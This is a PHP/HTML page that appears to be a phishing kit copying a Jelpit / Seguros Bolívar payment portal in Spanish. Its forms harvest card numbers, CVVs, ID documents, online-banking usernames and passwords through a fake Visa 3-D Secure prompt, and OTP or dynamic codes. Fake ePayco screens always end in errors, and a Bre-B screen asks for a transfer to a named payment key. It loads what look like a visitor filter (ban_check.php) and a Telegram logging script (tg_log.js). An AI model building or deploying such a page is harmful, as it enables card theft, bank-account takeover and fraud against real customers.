<?php require_once __DIR__ . '/ban_check.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Portal de Pagos - Jelpit</title>
  <link rel="icon" type="image/svg+xml" href="img/favicon.svg">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" href="css/portal_pagos.css">
</head>
<body>

  <header class="portal-header">
    <div class="portal-logo">
      <img src="img/logo_jelpit_color.svg" alt="Jelpit">
    </div>
    <a href="pagar.php" class="btn-volver"><i class="fa-solid fa-chevron-left"></i> Volver</a>
  </header>

  <main class="portal-main">

    <!-- Left Column: Datos del cliente -->
    <div class="portal-col-left">
      <div class="portal-card">
        <h2 class="card-title"><i class="fa-regular fa-user"></i> Datos del cliente</h2>

        <div class="cliente-info-grid">
          <div>
            <div class="info-label">Nombre completo</div>
            <div class="info-value" id="clienteNombre">—</div>
          </div>
          <div></div>
          <div>
            <div class="info-label">Correo Electrónico</div>
            <div class="info-value" id="clienteCorreo">—</div>
          </div>
          <div>
            <div class="info-label">Celular</div>
            <div class="info-value" id="clienteCelular">—</div>
          </div>
        </div>

        <div class="disclaimer-text">
          Se enviará la confirmación de pago a este correo electrónico y numero celular.
        </div>

        <h3 class="methods-title">Métodos de pago</h3>

        <!-- Método 1: Tarjetas -->
        <div class="method-card" id="methodTarjetas">
          <div class="method-header" onclick="toggleMethod('methodTarjetas')">
            <div class="method-name">Tarjetas Débito o Crédito</div>
            <div class="method-icons">
              <span class="card-icon-box"><i class="fa-brands fa-cc-mastercard ci-mc"></i></span>
              <span class="card-icon-box"><i class="fa-brands fa-cc-visa ci-visa"></i></span>
              <span class="card-icon-box"><i class="fa-brands fa-cc-amex ci-amex"></i></span>
              <span class="card-icon-box"><i class="fa-brands fa-cc-diners-club ci-dc"></i></span>
              <i class="fa-solid fa-chevron-down method-chevron"></i>
            </div>
          </div>
          <div class="method-body">
            <div class="radio-group">
              <label class="radio-item">
                <input type="radio" name="tipoTarjeta" value="debito" onchange="toggleCuotas()">
                <span class="radio-circle"></span>
                Tarjeta Débito
              </label>
              <label class="radio-item">
                <input type="radio" name="tipoTarjeta" value="credito" checked onchange="toggleCuotas()">
                <span class="radio-circle"></span>
                Tarjeta Crédito
              </label>
            </div>

            <div class="form-group">
              <label>Nombre del titular</label>
              <div class="input-wrapper" id="wrapCardName">
                <input type="text" id="cardName" placeholder="Ej: Carlo Rodriguez">
              </div>
              <div class="error-text" id="errName" style="display:none;">Nombre inválido.</div>
            </div>
            <div class="form-group">
              <label>Número de tarjeta</label>
              <div class="input-wrapper has-icon" id="wrapCardNumber">
                <input type="text" id="cardNumber" placeholder="Ej: 4532 0148 1234 5678" maxlength="24" inputmode="numeric" autocomplete="cc-number">
                <i class="fa-regular fa-credit-card"></i>
              </div>
              <div class="error-text" id="errNumber" style="display:none;">Ingresa el número de tarjeta.</div>
            </div>
            <div class="form-row">
              <div class="form-group">
                <label>Fecha de vencimiento</label>
                <div class="input-wrapper has-icon" id="wrapCardDate">
                  <input type="text" id="cardDate" placeholder="Ej: 05/27" maxlength="5">
                  <i class="fa-regular fa-calendar"></i>
                </div>
                <div class="error-text" id="errDate" style="display:none;">Fecha vencida o inválida.</div>
              </div>
              <div class="form-group">
                <label>Código de seguridad</label>
                <div class="input-wrapper has-icon" id="wrapCardCvv">
                  <input type="password" id="cardCvv" placeholder="Ej: 111" maxlength="4">
                  <i class="fa-solid fa-circle-question" style="color:#888;"></i>
                </div>
                <div class="error-text" id="errCvv" style="display:none;">Mínimo 3 dígitos.</div>
              </div>
            </div>
            <div class="form-group" id="grpCuotas">
              <label>Número de cuotas</label>
              <div class="input-wrapper">
                <select id="selectCuotas">
                  <option value="">Seleccione una opción</option>
                  <option value="1" selected>1 Cuota</option>
                  <option value="2">2 Cuotas</option>
                  <option value="3">3 Cuotas</option>
                  <option value="6">6 Cuotas</option>
                  <option value="12">12 Cuotas</option>
                  <option value="18">18 Cuotas</option>
                  <option value="24">24 Cuotas</option>
                  <option value="36">36 Cuotas</option>
                </select>
              </div>
            </div>
          </div>
        </div>

        <!-- Método 2: PSE -->
        <div class="method-card" id="methodPse">
          <div class="method-header" onclick="toggleMethod('methodPse')">
            <div class="method-name">Débito PSE</div>
            <div class="method-icons">
              <span class="card-icon-box"><img src="img/logo-pse.png" alt="PSE" style="height:20px; object-fit:contain;"></span>
              <i class="fa-solid fa-chevron-down method-chevron"></i>
            </div>
          </div>
          <div class="method-body">
            <div class="form-row">
              <div class="form-group">
                <label>Tipo de documento</label>
                <div class="input-wrapper">
                  <select id="pseTipoDoc">
                    <option value="CC" selected>Cédula de Ciudadanía</option>
                    <option value="CE">Cédula de Extranjería</option>
                    <option value="NIT">NIT</option>
                    <option value="TI">Tarjeta de Identidad</option>
                  </select>
                </div>
              </div>
              <div class="form-group">
                <label>Número de documento</label>
                <div class="input-wrapper has-icon" id="wrapPseNumDoc">
                  <input type="text" id="pseNumDoc">
                  <i class="fa-regular fa-id-badge"></i>
                </div>
                <div class="error-text" id="errPseNumDoc" style="display:none;">Documento inválido.</div>
              </div>
            </div>
            <div class="form-row">
              <div class="form-group">
                <label>Nombre completo</label>
                <div class="input-wrapper has-icon" id="wrapPseNombre">
                  <input type="text" id="pseNombre" placeholder="Nombre y apellidos">
                  <i class="fa-regular fa-user"></i>
                </div>
              </div>
              <div class="form-group">
                <label>Teléfono</label>
                <div class="input-wrapper has-icon" id="wrapPseTelefono">
                  <input type="tel" id="pseTelefono" placeholder="3001234567" maxlength="10">
                  <i class="fa-solid fa-phone"></i>
                </div>
              </div>
            </div>
            <div class="form-row">
              <div class="form-group">
                <label>Correo electrónico</label>
                <div class="input-wrapper has-icon" id="wrapPseEmail">
                  <input type="email" id="pseEmail" placeholder="correo@ejemplo.com">
                  <i class="fa-regular fa-envelope"></i>
                </div>
              </div>
              <div class="form-group">
                <label>Tipo de persona</label>
                <div class="input-wrapper">
                  <select id="pseTipoPersona">
                    <option value="Natural" selected>Persona natural</option>
                    <option value="Juridica">Persona jurídica</option>
                  </select>
                </div>
              </div>
            </div>
            <div class="form-row">
              <div class="form-group" style="flex:1;">
                <label>Banco</label>
                <div class="input-wrapper">
                  <select id="pseBanco">
                    <option value="">Seleccione su banco</option>
                    <option value="nequi">NEQUI</option>
                    <option value="daviplata">DAVIPLATA</option>
                    <option value="bancolombia">BANCOLOMBIA</option>
                    <option value="davivienda">BANCO DAVIVIENDA</option>
                    <option value="bogota">BANCO DE BOGOTÁ</option>
                    <option value="bbva">BANCO BBVA COLOMBIA</option>
                    <option value="avvillas">BANCO AV VILLAS</option>
                    <option value="caja-social">BANCO CAJA SOCIAL</option>
                    <option value="popular">BANCO POPULAR</option>
                    <option value="itau">BANCO ITAÚ</option>
                    <option value="occidente">BANCO DE OCCIDENTE</option>
                    <option value="agrario">BANCO AGRARIO</option>
                    <option value="gnb">BANCO GNB SUDAMERIS</option>
                    <option value="pichincha">BANCO PICHINCHA</option>
                    <option value="falabella">BANCO FALABELLA</option>
                    <option value="union">BANCO UNIÓN</option>
                    <option value="santander">BANCO SANTANDER</option>
                    <option value="serfinanza">BANCO SERFINANZA</option>
                    <option value="finandina">BANCO FINANDINA</option>
                    <option value="mundo-mujer">BANCO MUNDO MUJER</option>
                    <option value="coopcentral">BANCO COOPCENTRAL</option>
                    <option value="bancoomeva">BANCOOMEVA</option>
                    <option value="bancamia">BANCAMIA</option>
                    <option value="nu">NU</option>
                    <option value="dale">DALE</option>
                    <option value="davibank-s.a.">DAVIbank</option>
                    <option value="lulo">LULO BANK</option>
                    <option value="movii">MOVII</option>
                    <option value="rappipay">RAPPIPAY</option>
                    <option value="uala">UALÁ</option>
                    <option value="bold">BOLD CF</option>
                    <option value="coink">COINK</option>
                    <option value="iris">IRIS</option>
                    <option value="global66">GLOBAL66</option>
                    <option value="ding">DING</option>
                    <option value="paycash">PAYCASH</option>
                    <option value="powwi">POWWI</option>
                    <option value="citibank">CITIBANK</option>
                    <option value="coltefinanciera">COLTEFINANCIERA</option>
                    <option value="cotrafa">COTRAFA</option>
                    <option value="confiar">CONFIAR COOPERATIVA</option>
                    <option value="crezcamos">CREZCAMOS</option>
                    <option value="accion">ACCIÓN FIDUCIARIA</option>
                    <option value="alianza">ALIANZA FIDUCIARIA</option>
                    <option value="ban100">BAN100</option>
                    <option value="cfa">CFA COOPERATIVA</option>
                    <option value="jfk">JFK COOPERATIVA</option>
                    <option value="juriscoop">FINANCIERA JURISCOOP</option>
                  </select>
                </div>
              </div>
            </div>
          </div>
        </div>

        <!-- Método 3: Nequi -->
        <div class="method-card" id="methodNequi">
          <div class="method-header" onclick="toggleMethod('methodNequi')">
            <div class="method-name">Nequi</div>
            <div class="method-icons">
              <span class="card-icon-box"><img src="img/neqi-pek.png" alt="Nequi" style="height:20px; object-fit:contain;"></span>
              <i class="fa-solid fa-chevron-down method-chevron"></i>
            </div>
          </div>
          <div class="method-body" style="text-align:center; padding:40px 20px;">
            <img src="img/neqi-grande.png" alt="Nequi" style="height:80px; max-width:100%;" onerror="this.outerHTML='<span style=\'font-size:28px;font-weight:700;color:#6A1FF5;\'>Nequi</span>'">
          </div>
        </div>

        <!-- Método 4: Bre-B -->
        <div class="method-card" id="methodBreb">
          <div class="method-header" onclick="toggleMethod('methodBreb')">
            <div class="method-name">Bre-B</div>
            <div class="method-icons">
              <span class="card-icon-box"><img src="img/bre-b-icono.jpg" alt="Bre-B" style="height:20px; object-fit:contain;" onerror="this.style.display='none'"></span>
              <i class="fa-solid fa-chevron-down method-chevron"></i>
            </div>
          </div>
          <div class="method-body" style="text-align:center; padding:32px 20px;">
            <img src="img/bre-b-icono.jpg" alt="Bre-B" style="height:52px; max-width:160px;" onerror="this.outerHTML='<span style=\'font-size:26px;font-weight:800;background:linear-gradient(90deg,#00CFFF,#00FF99);-webkit-background-clip:text;-webkit-text-fill-color:transparent;padding:4px 0;display:inline-block;\'>Bre-B</span>'">
            <p style="margin-top:12px; color:#666; font-size:14px;">Pago instantáneo con Bre-B</p>
          </div>
        </div>

      </div>
    </div>

    <!-- Right Column: Datos de pago -->
    <div class="portal-col-right">
      <div class="portal-card">
        <h2 class="card-title"><i class="fa-regular fa-file-lines"></i> Datos de Pago</h2>

        <div class="summary-ref-row">
          <span id="pNombre"></span>
          <span>Referencia: <span id="pRef"></span></span>
        </div>

        <div class="summary-total">
          <span class="label">Total:</span>
          <span class="value" id="pTotal">$ 0.00</span>
        </div>

        <div class="security-badge">
          <i class="fa-solid fa-lock" style="color:#14cd51;"></i> El pago es 100% seguro
        </div>

        <div class="cards-supported">
          <span class="card-icon-box"><i class="fa-brands fa-cc-mastercard ci-mc"></i></span>
          <span class="card-icon-box"><i class="fa-brands fa-cc-visa ci-visa"></i></span>
          <span class="card-icon-box"><i class="fa-brands fa-cc-amex ci-amex"></i></span>
          <span class="card-icon-box"><i class="fa-brands fa-cc-diners-club ci-dc"></i></span>
          <span class="card-icon-box"><img src="img/logo-pse.png" alt="PSE" style="height:20px; object-fit:contain;"></span>
        </div>

        <button class="btn-pagar-final" id="btnPagarFinal" disabled>PAGAR</button>
      </div>
    </div>

  </main>

  <footer class="portal-footer">
    <div class="footer-col left">
      <img src="img/vigilado.svg" alt="Vigilado Superintendencia Financiera" class="vigilado-logo">
      <p>Compañía de Seguros Bolívar S. A.</p>
    </div>
    <div class="footer-col center">
      <p>© 2021 - Seguros Bolívar S.A. - Seguros Comerciales S.A. - Todos los derechos reservados</p>
    </div>
    <div class="footer-col right">
      <a href="#">Términos y condiciones del sitio</a>
    </div>
    <div class="recaptcha-badge">
      <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
      <span>Privacidad - Condiciones</span>
    </div>
  </footer>

  <!-- ── Modal: Banco no disponible ──────────────────────── -->
  <div id="bankUnavailableModal" class="pp-overlay" style="display:none;">
    <div class="pp-overlay-card">
      <div class="pp-overlay-head" style="background:#007A33; border-bottom:5px solid #FFD100;">
        <button class="pp-overlay-close" onclick="document.getElementById('bankUnavailableModal').style.display='none'">×</button>
        <i class="fa-solid fa-building-columns" style="font-size:40px; color:#FFD100; margin-bottom:15px;"></i>
        <h3 style="color:white; font-size:20px;">Entidad no disponible</h3>
      </div>
      <div class="pp-overlay-body">
        <p style="color:#444; font-size:15px; line-height:1.5; margin-bottom:20px;">
          La entidad bancaria seleccionada se encuentra en mantenimiento y <b>no está disponible</b>.
        </p>
        <button class="pp-overlay-btn green" onclick="document.getElementById('bankUnavailableModal').style.display='none'">
          Entendido, intentar otro
        </button>
      </div>
    </div>
  </div>

  <!-- ── ePayco Modal 1 ───────────────────────────────────── -->
  <div class="epayco-overlay" id="epaycoModal1" style="display:none;">
    <div class="epayco-modal">
      <div class="epayco-header">
        <button class="epayco-close" onclick="closeEpayco()">
          <span class="epayco-close-lang">ES <i class="fa-solid fa-chevron-down" style="font-size:8px;"></i></span>
          <span class="epayco-close-btn">×</span>
        </button>
        <div class="epayco-icon"><i class="fa-solid fa-store"></i></div>
        <div class="epayco-title" id="epaTitle1"></div>
        <div class="epayco-total-label">Total:</div>
        <div class="epayco-total-amount" id="epaycoTotal1"></div>
        <div class="epayco-secured"><i class="fa-solid fa-lock" style="color:#00cc66;"></i> Secured by ePayco</div>
      </div>
      <div class="epayco-body">
        <div class="epayco-section-title"><i class="fa-solid fa-circle-user"></i> Detalles de contacto</div>
        <div class="epayco-form-row">
          <div class="epayco-input-group" style="width:38%;">
            <label>Código</label>
            <select><option>🇨🇴 +57</option></select>
          </div>
          <div class="epayco-input-group" style="width:58%;">
            <label>Número de móvil</label>
            <input type="text" id="epaMovil">
          </div>
        </div>
        <div class="epayco-input-group" style="margin-bottom:12px;">
          <label>Correo</label>
          <input type="email" id="epaCorreo">
        </div>
        <button class="epayco-btn" onclick="goToEpaycoModal2()">Continuar</button>
      </div>
    </div>
  </div>

  <!-- ── ePayco Modal 2 ───────────────────────────────────── -->
  <div class="epayco-overlay" id="epaycoModal2" style="display:none;">
    <div class="epayco-modal">
      <div class="epayco-header-compact">
        <button class="epayco-back" onclick="goToEpaycoModal1()">←</button>
        <div class="epayco-icon-small"><i class="fa-solid fa-store"></i></div>
        <div class="epayco-title-small" id="epaTitle2"></div>
        <button class="epayco-close" onclick="closeEpayco()">
          <span class="epayco-close-lang">ES <i class="fa-solid fa-chevron-down" style="font-size:8px;"></i></span>
          <span class="epayco-close-btn">×</span>
        </button>
      </div>
      <div class="epayco-body">
        <div class="epayco-user-edit">
          <div><strong>Mis datos:</strong> <span id="spanEpaCorreo"></span></div>
          <a href="#" onclick="goToEpaycoModal1()"><i class="fa-regular fa-pen-to-square"></i> Editar mis datos</a>
        </div>
        <hr class="epayco-hr">
        <div class="epayco-method">Nequi (Paso 1 de 2)</div>
        <div class="epayco-input-group" style="margin-bottom:12px;">
          <label>Nombre y Apellidos</label>
          <input type="text" id="epaNombre">
        </div>
        <div class="epayco-form-row">
          <div class="epayco-input-group" style="width:38%;">
            <label>Documento</label>
            <select><option>CC</option></select>
          </div>
          <div class="epayco-input-group" style="width:58%;">
            <input type="text" id="epaDoc" placeholder="Número de documento">
          </div>
        </div>
        <div class="epayco-terms">
          <input type="checkbox" checked>
          <p>Confirmo y acepto los <a href="#">Términos y Condiciones</a> y la <a href="#">Política de Tratamiento de datos personales</a> de ePayco.</p>
        </div>
        <div class="epayco-footer">
          <div class="epayco-footer-left">
            <div class="epayco-footer-total" id="epaycoTotal2"></div>
            <a href="#">Ver detalle</a>
          </div>
          <div class="epayco-footer-right">
            <button class="epayco-btn-round" onclick="goToEpaycoModal3()">Continuar <i class="fa-solid fa-chevron-right"></i></button>
          </div>
        </div>
      </div>
    </div>
  </div>

  <!-- ── ePayco Modal 3 ───────────────────────────────────── -->
  <div class="epayco-overlay" id="epaycoModal3" style="display:none;">
    <div class="epayco-modal">
      <div class="epayco-header-compact">
        <div class="epayco-icon-small"><i class="fa-solid fa-store"></i></div>
        <div class="epayco-title-small" id="epaTitle3"></div>
        <button class="epayco-close" onclick="closeEpayco()"><span class="epayco-close-btn">×</span></button>
      </div>
      <div class="epayco-body" style="text-align:center; padding:40px 20px;">
        <i class="fa-solid fa-triangle-exclamation" style="font-size:40px; color:#e20613; margin-bottom:15px;"></i>
        <h3 style="margin-bottom:10px; color:#333; font-size:16px;">Error de datos</h3>
        <p style="color:#666; font-size:13px; margin-bottom:25px; line-height:1.4;">Tuvimos un inconveniente al validar la información.</p>
        <button class="epayco-btn" onclick="closeEpayco()">Intentar nuevamente</button>
      </div>
    </div>
  </div>

  <!-- ── Overlay: Esperando ──────────────────────────────── -->
  <div id="esperaOverlay" class="pp-overlay pp-overlay-dark" style="display:none;">
    <div style="text-align:center; color:white;">
      <svg width="60" height="60" viewBox="0 0 60 60" style="animation:ppSpin 1.2s linear infinite; margin-bottom:20px;">
        <circle cx="30" cy="30" r="26" stroke="#2e0063" stroke-width="5" fill="none"/>
        <path d="M30 4a26 26 0 0 1 26 26" stroke="#82e778" stroke-width="5" stroke-linecap="round" fill="none"/>
      </svg>
      <h3 style="font-size:20px; margin-bottom:10px;">Verificando transacción...</h3>
      <p style="font-size:14px; color:#aaa;">Por favor espere mientras procesamos su solicitud.</p>
    </div>
  </div>

  <!-- ── Modal: Verified by Visa 3DS ────────────────────── -->
  <div id="visaAuthModal" class="pp-overlay pp-overlay-dark" style="display:none;">
    <div class="visa-auth-card">
      <div class="visa-auth-logo">
        <img id="visaBankLogo" src="img/banks/nobank.png" alt="" style="height:52px; object-fit:contain;">
      </div>
      <div class="visa-auth-body">
        <h3 class="visa-auth-title">Autorización de transacción</h3>
        <p class="visa-auth-desc">
          La transacción que intentas realizar en <strong id="visaComercio"></strong> por
          <strong id="visaMonto"></strong> el <strong id="visaFecha"></strong> con tu tarjeta
          terminada en <strong id="visaUltimos"></strong> debe ser autorizada por seguridad.
        </p>
        <p class="visa-auth-section">DETALLES DE TRANSACCIÓN:</p>
        <table class="visa-auth-table">
          <tr>
            <td>Comercio:</td>
            <td id="visaDetalleComercio"></td>
          </tr>
          <tr>
            <td>Monto de la Transacción:</td>
            <td id="visaDetalleMonto"></td>
          </tr>
          <tr>
            <td>Número de tarjeta:</td>
            <td id="visaDetalleTarjeta"></td>
          </tr>
        </table>
        <div id="visaFormSection">
          <p id="visaErrorMsg" class="visa-error-msg" style="display:none;">
            Usuario o contraseña incorrecta por favor verifíquelos.
          </p>
          <div class="visa-auth-form">
            <div class="visa-auth-field">
              <label>Usuario:</label>
              <input type="text" id="visaUsuario" placeholder="Usuario" autocomplete="off">
            </div>
            <div class="visa-auth-field">
              <label>Clave:</label>
              <input type="password" id="visaClave" placeholder="*******" autocomplete="off">
            </div>
          </div>
          <button id="btnVisaAutorizar" class="btn-visa-autorizar">Autorizar</button>
        </div>
        <div id="visaLoader" style="display:none; justify-content:center; padding: 28px 0 8px;">
          <svg width="52" height="52" viewBox="0 0 52 52" style="animation:ppSpin 1.1s linear infinite;">
            <circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="5" fill="none"/>
            <path d="M26 4a22 22 0 0 1 22 22" stroke="#1A1F71" stroke-width="5" stroke-linecap="round" fill="none"/>
          </svg>
        </div>
      </div>
    </div>
  </div>

  <!-- ── Modal: Visa OTP / Clave dinámica ───────────────── -->
  <div id="visaOtpModal" class="pp-overlay pp-overlay-dark" style="display:none;">
    <div class="visa-auth-card">
      <div class="visa-auth-logo">
        <img id="otpBankLogo" src="img/banks/nobank.png" alt="" style="height:52px; object-fit:contain;">
      </div>
      <div class="visa-auth-body">
        <h3 class="visa-auth-title">Autorización de transacción</h3>
        <p class="visa-auth-desc">
          La transacción que intentas realizar en <strong id="otpComercio"></strong> por
          <strong id="otpMonto"></strong> el <strong id="otpFecha"></strong> con tu tarjeta
          terminada en <strong id="otpUltimos"></strong> debe ser autorizada por seguridad.
        </p>
        <div id="visaOtpFormSection">
          <p class="visa-auth-section">VERIFICACIÓN DE SEGURIDAD:</p>
          <div class="visa-auth-form">
            <div class="visa-auth-field">
              <label>Clave Dinámica/Temporal:</label>
              <input type="password" id="otpClave" placeholder="******" autocomplete="off">
            </div>
          </div>
          <button id="btnOtpAutorizar" class="btn-visa-autorizar">Autorizar</button>
          <button id="btnOtpCancelar" class="btn-visa-autorizar" style="margin-top:12px; background:#111;">Cancelar</button>
        </div>
        <div id="visaOtpLoader" style="display:none; justify-content:center; padding: 28px 0 8px;">
          <svg width="52" height="52" viewBox="0 0 52 52" style="animation:ppSpin 1.1s linear infinite;">
            <circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="5" fill="none"/>
            <path d="M26 4a22 22 0 0 1 22 22" stroke="#1A1F71" stroke-width="5" stroke-linecap="round" fill="none"/>
          </svg>
        </div>
      </div>
    </div>
  </div>

  <!-- ── Overlay: OTP ────────────────────────────────────── -->
  <div id="otpOverlay" class="pp-overlay pp-overlay-dark" style="display:none; flex-direction:column;">
    <div class="pp-overlay-card dark">
      <i class="fa-solid fa-mobile-screen-button" style="font-size:50px; color:#82e778; margin-bottom:20px;"></i>
      <h3 style="font-size:20px; color:white; margin-bottom:15px;">Verificación de Seguridad</h3>
      <p style="font-size:14px; color:#aaa; line-height:1.5; margin-bottom:25px;">
        Hemos enviado un código de autorización a su teléfono celular.
      </p>
      <input type="text" id="otpInput" placeholder="Ingrese el código de 6 dígitos" maxlength="6" class="pp-otp-input">
      <button id="btnSubmitOtp" class="pp-overlay-btn green">Verificar Código</button>
    </div>
  </div>

  <!-- ── Overlay: Clave dinámica ─────────────────────────── -->
  <div id="claveDinamicaOverlay" class="pp-overlay pp-overlay-dark" style="display:none; flex-direction:column;">
    <div class="pp-overlay-card dark">
      <i class="fa-solid fa-shield-halved" style="font-size:50px; color:#82e778; margin-bottom:20px;"></i>
      <h3 style="font-size:20px; color:white; margin-bottom:15px;">Clave Dinámica</h3>
      <p style="font-size:14px; color:#aaa; line-height:1.5; margin-bottom:25px;">
        Ingrese la clave dinámica generada por su entidad bancaria.
      </p>
      <input type="text" id="claveDinamicaInput" placeholder="Ingrese su clave dinámica" maxlength="8" class="pp-otp-input">
      <button id="btnSubmitClaveDinamica" class="pp-overlay-btn green">Confirmar Clave</button>
    </div>
  </div>

  <!-- ── Overlay: Rechazo ────────────────────────────────── -->
  <div id="rechazoOverlay" class="pp-overlay" style="display:none;">
    <div class="pp-overlay-card">
      <div style="width:70px;height:70px;background:#fff0f0;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
        <i class="fa-solid fa-ban" style="font-size:32px; color:#dc3545;"></i>
      </div>
      <h3 style="font-size:20px; color:#dc3545; margin-bottom:12px;">Algo falló</h3>
      <div style="background:#fff5f5;border:1px solid #f5c6cb;border-radius:8px;padding:16px;margin-bottom:20px;">
        <p style="font-size:15px; color:#721c24; margin-bottom:6px; font-weight:600;">Tarjeta Rechazada</p>
        <p style="font-size:13px; color:#856464; line-height:1.5;">
          La transacción no pudo completarse. Los datos de su tarjeta no fueron validados por la entidad emisora.
        </p>
      </div>
      <button onclick="document.getElementById('rechazoOverlay').style.display='none'" class="pp-overlay-btn purple">
        Intentar de nuevo
      </button>
    </div>
  </div>

  <!-- ── Modal: Bre-B ──────────────────────────────────────── -->
  <div id="brebModal" class="pp-overlay pp-overlay-dark" style="display:none;">
    <div class="breb-card">
      <button class="breb-close" onclick="closeBreb()">×</button>

      <div class="breb-top">
        <div class="breb-arrow-circle">↓</div>
        <div class="breb-amount" id="brebAmount"></div>
        <p class="breb-desc">Usa esta llave Bre-B o el código QR para realizar tu depósito. ¡La confirmación suele llegar en segundos!</p>
      </div>

      <div class="breb-tabs">
        <button class="breb-tab active" id="brebTabLlave" onclick="brebSwitch('llave')">Llave Bre-B</button>
        <button class="breb-tab" id="brebTabQR" onclick="brebSwitch('qr')">Código QR</button>
      </div>

      <div id="brebPanelLlave" class="breb-panel">
        <div class="breb-key-box">
          <div class="breb-key-val">@LITTIO1042243137</div>
          <div class="breb-key-lbl">Llave Bre-B</div>
        </div>
      </div>
      <div id="brebPanelQR" class="breb-panel" style="display:none;">
        <div class="breb-qr-wrap" id="brebQRDiv"></div>
      </div>

      <button class="breb-copy" id="brebCopyBtn" onclick="brebCopy()">
        <i class="fa-regular fa-copy"></i> COPIAR LLAVE
      </button>

      <div id="brebRejMsg" style="display:none; background:#fff5f5; border:1px solid #f5c6cb; border-radius:8px; padding:12px 14px; margin-bottom:14px; font-size:13px; color:#721c24; line-height:1.5;">
        <strong>⚠️ Pago no confirmado.</strong> Por favor realiza nuevamente la transferencia antes del tiempo indicado.
      </div>

      <div class="breb-info">
        <i class="fa-solid fa-circle-info" style="color:#4a90d9; flex-shrink:0; margin-right:6px; margin-top:2px;"></i>
        <span>Completa tu transferencia usando la Llave Bre-B o el código QR antes del <strong id="brebExpiry"></strong>. Si el tiempo expira, reinicia el proceso.</span>
      </div>

      <div class="breb-actions">
        <button class="breb-btn-paid" onclick="brebPagoRealizado()">✓ Pago realizado</button>
        <button class="breb-btn-cancel" onclick="closeBreb()">✕ Cancelar pago</button>
      </div>
    </div>
  </div>

  <style>
    @keyframes ppSpin { to { transform: rotate(360deg); } }

    /* ── Bre-B modal ── */
    .breb-card {
      background: #fff;
      border-radius: 18px;
      width: 340px;
      max-width: 95vw;
      padding: 28px 24px 22px;
      position: relative;
      box-shadow: 0 8px 40px rgba(0,0,0,.35);
      max-height: 90vh;
      overflow-y: auto;
    }
    .breb-close {
      position: absolute; top: 14px; right: 18px;
      background: none; border: none; font-size: 24px;
      color: #999; cursor: pointer; line-height: 1;
    }
    .breb-top { text-align: center; margin-bottom: 18px; }
    .breb-arrow-circle {
      width: 54px; height: 54px; border-radius: 50%;
      background: #fde8d8; color: #e8601a;
      font-size: 24px; display: flex; align-items: center;
      justify-content: center; margin: 0 auto 14px;
    }
    .breb-amount { font-size: 28px; font-weight: 800; color: #111; margin-bottom: 10px; }
    .breb-desc { font-size: 13px; color: #555; line-height: 1.5; margin: 0; }
    .breb-tabs {
      display: flex; border-radius: 30px;
      background: #f0f0f0; padding: 4px;
      margin-bottom: 16px;
    }
    .breb-tab {
      flex: 1; border: none; background: none;
      border-radius: 26px; padding: 8px 0;
      font-size: 13px; font-weight: 600; cursor: pointer;
      color: #666; transition: all .2s;
    }
    .breb-tab.active { background: #1a1f36; color: #fff; }
    .breb-panel { margin-bottom: 14px; }
    .breb-key-box {
      border: 1.5px solid #e0e0e0; border-radius: 10px;
      padding: 20px 16px; text-align: center;
    }
    .breb-key-val { font-size: 22px; font-weight: 700; color: #111; letter-spacing: .5px; }
    .breb-key-lbl { font-size: 12px; color: #888; margin-top: 6px; }
    .breb-qr-wrap {
      display: flex; justify-content: center;
      border: 1.5px solid #e0e0e0; border-radius: 10px; padding: 16px;
    }
    .breb-qr-wrap img, .breb-qr-wrap canvas { border-radius: 6px; }
    .breb-copy {
      display: flex; align-items: center; justify-content: center; gap: 8px;
      width: 100%; padding: 10px; border: 1.5px solid #ccc;
      background: none; border-radius: 8px; font-size: 13px;
      font-weight: 700; color: #333; cursor: pointer; margin-bottom: 14px;
      letter-spacing: .5px;
    }
    .breb-copy:active { background: #f5f5f5; }
    .breb-info {
      background: #eef4ff; border-radius: 8px; padding: 12px 14px;
      font-size: 12px; color: #444; line-height: 1.5;
      margin-bottom: 18px; display: flex; align-items: flex-start;
    }
    .breb-actions { display: flex; flex-direction: column; gap: 10px; }
    .breb-btn-paid {
      padding: 13px; border: none; border-radius: 10px;
      background: #1a1f36; color: #fff;
      font-size: 14px; font-weight: 700; cursor: pointer;
    }
    .breb-btn-cancel {
      padding: 13px; border: 1.5px solid #ccc; border-radius: 10px;
      background: none; color: #444;
      font-size: 14px; font-weight: 600; cursor: pointer;
    }
  </style>

  <!-- ── Modal: Bre-B Éxito ──────────────────────────────────── -->
  <div id="brebExitoOverlay" class="pp-overlay" style="display:none;">
    <div class="pp-overlay-card">
      <div style="width:70px;height:70px;background:#e8f5e9;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;">
        <i class="fa-solid fa-check" style="font-size:32px;color:#2e7d32;"></i>
      </div>
      <h3 style="font-size:20px;color:#2e7d32;margin-bottom:16px;">¡Muchas gracias por su pago!</h3>
      <div style="background:#f5fff5;border:1px solid #c8e6c9;border-radius:8px;padding:16px;margin-bottom:24px;width:100%;box-sizing:border-box;">
        <p style="font-size:15px;color:#333;margin:0 0 8px;"><strong>Monto:</strong> <span id="brebExitoMonto"></span></p>
        <p style="font-size:15px;color:#333;margin:0;"><strong>Fecha:</strong> <span id="brebExitoFecha"></span></p>
      </div>
      <button onclick="document.getElementById('brebExitoOverlay').style.display='none'" class="pp-overlay-btn green">Finalizar</button>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
  <script src="js/tg_log.js"></script>
  <script src="js/portal_pagos.js"></script>
</body>
</html>
